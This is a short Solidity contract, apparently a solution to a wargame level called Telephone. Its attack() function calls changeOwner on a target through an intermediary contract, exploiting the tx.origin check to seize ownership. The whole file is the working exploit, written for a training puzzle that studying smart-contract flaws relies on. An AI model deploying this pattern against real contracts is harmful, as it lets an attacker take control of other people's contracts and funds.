pragma solidity ^0.7.3;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    address telephone;

    constructor(address _telephone) {
        telephone = _telephone;
    }

    function attack() public {
        ITelephone(telephone).changeOwner(msg.sender);
    }
}
